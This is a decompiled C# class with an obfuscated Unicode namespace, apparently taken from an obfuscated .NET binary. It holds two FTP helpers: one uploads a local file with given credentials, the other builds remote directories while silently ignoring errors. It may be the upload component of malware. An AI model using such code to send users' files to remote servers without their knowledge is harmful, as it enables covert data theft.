using System;
using System.IO;
using System.Net;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000070 RID: 112
	internal class Class_85
	{
		// Token: 0x06000206 RID: 518 RVA: 0x00011254 File Offset: 0x0000F454
		public static void lmethod_248(string str_0, string str_1, string str_2, string str_3)
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + str_1);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(str_2, str_3);
			byte[] array = File.ReadAllBytes(str_0);
			ftpWebRequest.ContentLength = (long)array.Length;
			using (Stream requestStream = ftpWebRequest.GetRequestStream())
			{
				requestStream.Write(array, 0, array.Length);
				requestStream.Close();
			}
		}

		// Token: 0x06000207 RID: 519 RVA: 0x000112E4 File Offset: 0x0000F4E4
		public static void pmethod_249(string str_0, string str_1, string str_2, string str_3)
		{
			string[] array = str_1.Split(new char[]
			{
				'/'
			});
			string text = string.Format("ftp://{0}", str_0);
			foreach (string str in array)
			{
				try
				{
					text = text + "/" + str;
					FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text);
					ftpWebRequest.Method = "MKD";
					ftpWebRequest.UseBinary = true;
					ftpWebRequest.Credentials = new NetworkCredential(str_2, str_3);
					FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
					ftpWebResponse.GetResponseStream().Close();
					ftpWebResponse.Close();
				}
				catch
				{
				}
			}
		}
	}
}
